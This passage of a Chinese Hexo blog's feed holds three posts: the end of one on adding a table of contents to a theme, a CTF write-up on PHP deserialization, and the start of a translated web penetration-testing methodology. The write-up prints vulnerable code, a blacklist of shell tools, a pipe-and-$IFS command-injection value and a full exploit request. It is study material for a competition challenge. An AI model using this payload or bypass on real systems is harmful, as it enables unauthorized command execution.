&lt;footer class=&quot;post-footer&quot;&gt;</span><br><span class="line">                &#123;% if post.tags and post.tags.length %&#125;</span><br><span class="line">                &lt;div class=&quot;post-tags&quot;&gt;</span><br><span class="line">                  &#123;% for tag in post.tags %&#125;</span><br><span class="line">                        &lt;a href=&quot;&#123;&#123; url_for(tag.path) &#125;&#125;&quot;&gt;&#123;&#123; tag.name &#125;&#125;&lt;/a&gt;</span><br><span class="line">                  &#123;% endfor %&#125;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line">        &#123;# Post Pagination #&#125;</span><br><span class="line">        &#123;% include &quot;../_partial/pagination.swig&quot; %&#125;</span><br><span class="line">        &#123;% include &quot;../_partial/comments.swig&quot; %&#125;</span><br><span class="line">      &lt;/footer&gt;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &lt;/article&gt;</span><br><span class="line">&#123;% endmacro %&#125;</span><br></pre></td></tr></table></figure><p>可以看出这果然就是个渲染post的模板，其中<code>{% if not is_home() %}</code>值得我们注意，大概分析下就是主页的<code>post</code>目录和<code>post</code>的具体内容的渲染都是通过这个模板文件渲染的，然后通过这个if语句来识别不同的上下文。大概渲染逻辑搞明白了，按照之前的思路，我们还需要寻找css文件的位置。在主题的source目录发现<code>_layout.scss</code>，使用<code>scss</code>写的</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#content</span> &#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="variable">$global-content-margin</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">90%</span>;</span><br><span class="line">        <span class="attribute">max-width</span>: <span class="variable">$global-body-width</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#primary</span><span class="selector-class">.home</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">73%</span>;</span><br><span class="line">    <span class="attribute">float</span>: left;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#primary</span> &#123;</span><br><span class="line">    <span class="attribute">max-width</span>: <span class="number">850px</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="variable">$global-content-margin</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="keyword">include</span> max-screen() &#123;</span><br><span class="line">  <span class="selector-class">.site-header-inner</span>, <span class="selector-class">.content</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">90%</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="selector-id">#secondary</span> &#123;</span><br><span class="line">      <span class="attribute">display</span>: none;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="selector-id">#primary</span><span class="selector-class">.home</span> &#123;</span><br><span class="line">      <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到id为<code>primary</code>的大容器的css样式定义在这里，接下来就可以动手了！</p><h2 id="修改主题源码"><a href="#修改主题源码" class="headerlink" title="修改主题源码"></a>修改主题源码</h2><h3 id="增加TOC"><a href="#增加TOC" class="headerlink" title="增加TOC"></a>增加TOC</h3><p>我觉得TOC目录应该也是属于post的内容的一部分，于是就在<code>layout/_macro/post.swig</code>文件尾部添加了toc函数，这里注意官网给的是<code>ejs</code>的语法样例，我们要按照<code>swig</code>的语法来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">&#123;% if not is_home() and toc(page.content, &#123;class: &apos;post-test&apos;&#125;) !== &apos;&apos; %&#125;</span><br><span class="line">    &#123;% block toc %&#125;</span><br><span class="line">        &lt;div class=&quot;toc-container&quot;&gt;</span><br><span class="line">            &lt;div class=&quot;toc-article&quot;&gt;</span><br><span class="line">                &#123;&#123; toc(page.content, &#123;</span><br><span class="line">                    class: &apos;post-poc&apos;,</span><br><span class="line">                    list_number: false</span><br><span class="line">                &#125;)&#125;&#125;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &#123;% endblock %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><h3 id="调整TOC样式"><a href="#调整TOC样式" class="headerlink" title="调整TOC样式"></a>调整TOC样式</h3><p>添加完toc目录还不够，我们还需要修改css来调整toc的位置。<br>因为主题原本的主页和post页面都是包含在id为<code>primary</code>的大容器里面，通过<code>class=&quot;home&quot;</code>来调整主页不同的样式。我们模仿一下，在post的容器增加一个<code>class=&quot;post-container&quot;</code>来方便调整toc的样式。修改<code>layout/post.swig</code>如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends &quot;_layout.swig&quot; %&#125;</span><br><span class="line">&#123;% import &apos;_macro/post.swig&apos; as post_template %&#125;</span><br><span class="line">&#123;% block title %&#125; &#123;&#123; page.title &#125;&#125; - &#123;&#123; config.title &#125;&#125; &#123;% endblock %&#125;</span><br><span class="line">%&gt;</span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">    &lt;div id=&quot;primary&quot; class=&quot;post-container&quot;&gt;</span><br><span class="line">        &#123;&#123; post_template.render(page) &#125;&#125;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><p>再调整toc的位置，在<code>source/css/_layout.scss</code>中添加如下代码</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#primary</span><span class="selector-class">.post-container</span>&#123;</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">73%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后再调整<code>toc</code>本身的样式，在<code>source/css/_partial/_post.scss</code>中添加如下</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.toc-container</span> <span class="selector-class">.toc-article</span>&#123;</span><br><span class="line">  <span class="attribute">display</span>: block;</span><br><span class="line">  <span class="attribute">position</span>: fixed;</span><br><span class="line">  <span class="attribute">margin-left</span>: <span class="number">15px</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#f6f6f6</span>;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">10px</span>;</span><br><span class="line">  <span class="attribute">overflow-x</span>: auto;</span><br><span class="line">  <span class="attribute">overflow-y</span>: auto;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">12px</span>;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">25%</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">padding-bottom</span>: <span class="number">40px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">ol</span><span class="selector-class">.post-poc</span>&#123;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">padding-left</span>: <span class="number">15px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">ol</span><span class="selector-class">.post-poc-child</span>&#123;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">padding-left</span>: <span class="number">15px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>OK至此就大功告成啦~效果就像这篇博客的这种~。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;废话&quot;&gt;&lt;a href=&quot;#废话&quot; class=&quot;headerlink&quot; title=&quot;废话&quot;&gt;&lt;/a&gt;废话&lt;/h1&gt;&lt;p&gt;博客从大一就搭了，方案从github pages+hexo换到WordPress再到现在hexo+vultr，但博客却一直没有时间写。当初搭
      
    
    </summary>
    
    
      <category term="捣鼓" scheme="http://lxzmads.github.io/tags/%E6%8D%A3%E9%BC%93/"/>
    
  </entry>
  
  <entry>
    <title>2018福建省勤学杯一道简单的php反序列化</title>
    <link href="http://lxzmads.github.io/2018/08/25/2018%E7%A6%8F%E5%BB%BA%E7%9C%81%E5%8B%A4%E5%AD%A6%E6%9D%AF%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95%E7%9A%84php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://lxzmads.github.io/2018/08/25/2018福建省勤学杯一道简单的php反序列化/</id>
    <published>2018-08-24T16:00:00.000Z</published>
    <updated>2019-02-17T08:05:38.000Z</updated>
    
    <content type="html"><![CDATA[<p>这道题就是一道普普通通的反序列化题，但是在做题过程中体会良多。主要是在解题中使用docker来模拟赛题环境，真的是非常好用：）</p><p>页面提示git，访问.git/发现有源码，用工具下载下来。文件目录如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">- passage</span><br><span class="line">    - title.php</span><br><span class="line">- words.php</span><br><span class="line">- templates</span><br><span class="line">- About.php</span><br><span class="line">- Flag.php</span><br><span class="line">- Link.php</span><br><span class="line">- passage.php</span><br><span class="line">- class.php</span><br><span class="line">- index.php</span><br><span class="line">- waf.php</span><br></pre></td></tr></table></figure><p>开始看源码，index.php部分代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">$tips = @$_GET[<span class="string">'tips'</span>];</span><br><span class="line">$tip  = @$_GET[<span class="string">'tip'</span>];</span><br><span class="line"><span class="comment">// echo $tips;</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($tip)&amp;&amp;(@file_get_contents($tip,<span class="string">'r'</span>)===<span class="string">"you got this"</span>))&#123;</span><br><span class="line"><span class="comment">//echo 123;</span></span><br><span class="line">@unserialize($tips);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，从GET参数拿到$tips和$tip，判断tip是否存在以及tip文件的内容是否为<code>you got this</code>，这里可以用php://input伪协议绕过。然后就是对$tips进行反序列化，这里$tips是我们可控的。所以目前思路就是构造一个序列化后的对象，传入$tips来执行命令。</p><p>在class.php文件中发现我们需要的对象</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// class.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Blog</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $file=<span class="string">"passage"</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">$black = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($black <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line"><span class="keyword">if</span>(stripos(<span class="keyword">$this</span>-&gt;file,$value))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Attack!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">//echo "\n".$this-&gt;page;</span></span><br><span class="line">system(<span class="string">"php ./templates/$this-&gt;file.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$b =<span class="keyword">new</span> Blog();</span><br><span class="line"><span class="comment">//echo serialize($b);</span></span><br><span class="line"><span class="keyword">unset</span>($b);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到Blog对象在销毁时调用了system函数，函数的参数包含了<code>$file</code>的内容，<code>$file</code>的内容是我们可控的。题目强制将<code>$file</code>的内容拼接为<code>php ./templates/$this-&gt;file.php</code>命令，思路就是利用管道符来bypass。</p><p>但是注意到在调用system函数之前对<code>$file</code>的内容进行了黑盒检测，但黑名单是空？在很喜悦的构造了一个<code>$file = Flag.php|cat ../templates/Flag.php</code>在Burp中提交后，返回了<code>Attack!</code>，也就是说线上代码并不是我们看的这一版！但是线上waf到底有哪些呢？测试了一些之后，发现都被过滤，这样不是办法。转念一想，我们不是有.git嘛，线上的waf应该是在git的历史版本中，于是一个版本一个版本的check，最终在<code>ca0c1028af2</code>的版本中找到了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// class.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Blog</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $file=<span class="string">"passage"</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">$black = [<span class="string">'awk'</span>,<span class="string">'-'</span>,<span class="string">'sed'</span>,<span class="string">'comm'</span>,<span class="string">'diff'</span>,<span class="string">'grep'</span>,<span class="string">'cp'</span>,<span class="string">'mv'</span>,<span class="string">'nl'</span>,<span class="string">'less'</span>,<span class="string">'od'</span>,<span class="string">'cat'</span>,<span class="string">'head'</span>,<span class="string">'tail'</span>,<span class="string">'more'</span>,<span class="string">'tac'</span>,<span class="string">'rm'</span>,<span class="string">'ls'</span>,<span class="string">'tailf'</span>,<span class="string">' '</span>,<span class="string">'%'</span>,<span class="string">'%0a'</span>,<span class="string">'%0d'</span>,<span class="string">'%00'</span>,<span class="string">'ls'</span>,<span class="string">'echo'</span>,<span class="string">'ps'</span>,<span class="string">'&gt;'</span>,<span class="string">'&lt;'</span>,<span class="string">'$&#123;IFS&#125;'</span>,<span class="string">'ifconfig'</span>,<span class="string">'mkdir'</span>,<span class="string">'cp'</span>,<span class="string">'chmod'</span>,<span class="string">'wget'</span>,<span class="string">'curl'</span>,<span class="string">'http'</span>,<span class="string">'www'</span>,<span class="string">'`'</span>,<span class="string">'printf'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($black <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line"><span class="keyword">if</span>(stripos(<span class="keyword">$this</span>-&gt;file,$value))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Attack!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">//echo "\n".$this-&gt;page;</span></span><br><span class="line">system(<span class="string">"php ./templates/$this-&gt;file.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$b =<span class="keyword">new</span> Blog();</span><br><span class="line"><span class="comment">//echo serialize($b);</span></span><br><span class="line"><span class="keyword">unset</span>($b);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到过滤了空格和<code>${IFS}</code>，我们可以用<code>$IFS</code>作空格，过滤了很多查看文件的命令，但是没有过滤<code>rev</code>，没有过滤管道符。于是可以构造如下<code>$file</code>值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file = &apos;Flag.php|rev$IFS./templates/Flag&apos;</span><br></pre></td></tr></table></figure></p><blockquote><p>稍微提一下，这里黑盒判断用到了strops()，由于这个函数的漏洞，如果题目把管道符也过滤了，其实还可以做。构造 $file = ‘|rev$IFS./templates/Flag’ 就可以，因为管道符在第0位，并且可以无限用管道符，因为strops()只返回首次匹配的位置。</p></blockquote><p>这样system参数就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&quot;php ./templates/Flag.php|rev$IFS./templates/Flag.php&quot;)</span><br></pre></td></tr></table></figure><p>我用docker搭建了一个本地环境，测试成功返回了Flag文件的内容。</p><p>接下来就是生成序列化的Blog对象了，脚本如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// class.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Blog</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $file=<span class="string">'Flag.php|rev$IFS./templates/Flag'</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">$black = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($black <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line"><span class="keyword">if</span>(stripos(<span class="keyword">$this</span>-&gt;file,$value))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Attack!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">//echo "\n".$this-&gt;page;</span></span><br><span class="line">system(<span class="string">"php ./templates/$this-&gt;file.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$b =<span class="keyword">new</span> Blog();</span><br><span class="line"><span class="keyword">echo</span> serialize($b);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($b));</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A4%3A%22Blog%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A32%3A%22Flag.php%7Crev%24IFS.%2Ftemplates%2FFlag%22%3B%7D</span><br></pre></td></tr></table></figure><p>构造如下请求：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /?tip=php:<span class="comment">//input&amp;tips=O%3A4%3A%22Blog%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A32%3A%22Flag.php%7Crev%24IFS.%2Ftemplates%2FFlag%22%3B%7D HTTP/1.1</span></span><br><span class="line">Host: <span class="number">192.168</span><span class="number">.224</span><span class="number">.128</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Language: en</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 12</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">you got this</span></span><br></pre></td></tr></table></figure><p>成功返回反向的Flag文件内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php?&lt;</span><br><span class="line">;<span class="string">"&#125;0d4B_3B0_Ll10w_m03Tsys&#123;galf"</span> = galf$<span class="comment">//</span></span><br><span class="line"></span><br><span class="line">;<span class="string">"eclap rehto dnif ot yrt,ereh ton si galF"</span> ohce</span><br><span class="line">&gt;?&lt;!DOCTYPE HTML&gt;</span><br></pre></td></tr></table></figure><p>再次利用<code>rev</code>命令，得到flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//$flag = "flag&#123;sysT30m_w01lL_0B3_B4d0&#125;";</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Flag is not here,try to find other palce"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>这个flag是git仓库里面的，比赛时flag不是git仓库里面的。一开始稍微审计一会发现这个，很兴奋，提交发现是假的。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这道题就是一道普普通通的反序列化题，但是在做题过程中体会良多。主要是在解题中使用docker来模拟赛题环境，真的是非常好用：）&lt;/p&gt;
&lt;p&gt;页面提示git，访问.git/发现有源码，用工具下载下来。文件目录如下：&lt;/p&gt;
&lt;figure class=&quot;highlight 
      
    
    </summary>
    
    
      <category term="WEB" scheme="http://lxzmads.github.io/tags/WEB/"/>
    
      <category term="PHP" scheme="http://lxzmads.github.io/tags/PHP/"/>
    
      <category term="反序列化" scheme="http://lxzmads.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Web渗透方法论</title>
    <link href="http://lxzmads.github.io/2018/08/02/Web%E6%B8%97%E9%80%8F%E6%96%B9%E6%B3%95%E8%AE%BA/"/>
    <id>http://lxzmads.github.io/2018/08/02/Web渗透方法论/</id>
    <published>2018-08-01T16:00:00.000Z</published>
    <updated>2019-02-17T08:05:38.000Z</updated>
    
    <content type="html"><![CDATA[<p><em>本篇翻译自<a href="https://jdow.io/blog/2018/03/18/web-application-penetration-testing-methodology/" target="_blank" rel="noopener">这里</a></em></p><p>*译者注：文章对Web渗透测试全貌进行了描述，介绍了许多实用的想法与方法，仔细阅读会有收获EB</p><h2 id="0x00-序言"><a href="#0x00-序言" class="headerlink" title="0x00 序言"></a>0x00 序言</h2><p>这篇笔记是对Web应用程序渗透中的经典步骤的总结。我会将这些步骤分解为一个个的子任务并在各个子任务中推荐并介绍一些工具。</p><p>本文展示的许多技巧来自<a href="https://lanmaster53.com/" target="_blank" rel="noopener">这里</a>，作者已允许转载。</p><p>请记住我介绍的这些步骤都是迭代的，所以在一次渗透过程中，你可能会使用他们多次。举个栗子，当你设法获取一个应用程序的不同等级的权限时，比如从普通用户提升到管理员用户，可能就需要迭代利用。</p><p>序言最后需要说明的是，这篇笔记的很多地方使用了收费的PortSwigger的<a href="https://portswigger.net/burp" target="_blank" rel="noopener">Burp Suite Professional</a>。对此我表示抱歉，但我认为这个工具还是物超所值的。</p><h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h2><blockquote><p>在一次Web渗透过程中，信息收集的目的是站在旁观者的角度，去了解整个Web应用的全貌。</p></blockquote><h3 id="1-目标确认"><a href="#1-目标确认" class="headerlink" title="1. 目标确认"></a>1. 目标确认</h3><table><thead><tr><th>工具</th><th>简介</th></tr></thead><tbody><tr><td>Whois</td><td>基于RFC 3912，用于查询域名相关信息的协议。</td></tr><tr><td>Dig</td><td>域名信息获取工具(Domain information groper)简称，是一个命令行的用于查询DNS服务器的网络管理工具。</td></tr><tr><td>DNSRecon</td><td>自动化DNS枚举脚本，由<a href="https://github.com/darkoperator/dnsrecon" target="_blank" rel="noopener">darkoperator</a>维护。</td></tr></tbody></table><h4 id="1-1-域名注册信息"><a href="#1-1-域名注册信息" class="headerlink" title="1.1 域名注册信息"></a>1.1 域名注册信息</h4><p>通过如下步骤确认目标所有者信息：</p><ol><li><p>Whois 目标域名/主机名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whois example.com</span><br></pre></td></tr></table></figure></li><li><p>解析目标域名/主机名的IP地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig +short example.com</span><br></pre></td></tr></table></figure></li><li><p>Whois IP地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whois 104.27.178.12</span><br></pre></td></tr></table></figure></li><li><p>分析输出结果</p></li></ol><p>如果目标开启了whois隐私保护，那么返回的结果可能是经过混淆的。</p><blockquote><p>！！不要攻击未经授权的站点。作为渗透测试人员，有责任在测试之前明确自己有没有获得目标所有者赋予的权限对目标进行测试。这也是为什么目标确认是开始渗透测试的第一步。</p></blockquote><h4 id="1-2-DNS信息查询"><a href="#1-2-DNS信息查询" class="headerlink" title="1.2 DNS信息查询"></a>1.2 DNS信息查询</h4><p>我喜欢去 <a href="https://dnsdumpster.com/" target="_blank" rel="noopener">https://dnsdumpster.com/</a> 查询目标站点的DNS信息，这是一款很不错的在线DNS信息查询工具。</p><ul><li>正向查询</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dig +nocmd example.com A +noall +answer</span><br><span class="line">dig +nocmd example.com NS +noall +answer</span><br><span class="line">dig +nocmd example.com MX +noall +answer</span><br><span class="line">dig +nocmd example.com TXT +noall +answer</span><br><span class="line">dig +nocmd example.com SOA +noall +answer</span><br><span class="line">...</span><br><span class="line">dig +nocmd example.com ANY +noall +answer (This rarely works)</span><br></pre></td></tr></table></figure><ul><li>反向查询</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dig -x 104.27.179.12</span><br><span class="line">dig -x 104.27.178.12</span><br></pre></td></tr></table></figure><h4 id="1-3-测试域传送漏洞"><a href="#1-3-测试域传送漏洞" class="headerlink" title="1.3 测试域传送漏洞"></a>1.3 测试域传送漏洞</h4><p>域传送是一种DNS事务，用于在主从服务器间复制DNS记录。(译者注：可以看<a href="https://www.waitalone.cn/dns-domain-transfer-exploits.html" target="_blank" rel="noopener">这个</a>)虽然如今已经很少见主机会开启，但是还是应该确认一下。一旦存在域传送漏洞，就意味着你获取了整个域下面所有的记录。</p><blockquote><p>域传送漏洞很容易避免。至少管理员可以设置只允许白名单内的IP列表可以进行域传送请求。</p></blockquote><ul><li>使用示例</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dig -t NS zonetransfer.me +short</span><br><span class="line">dig -t AXFR zonetransfer.me 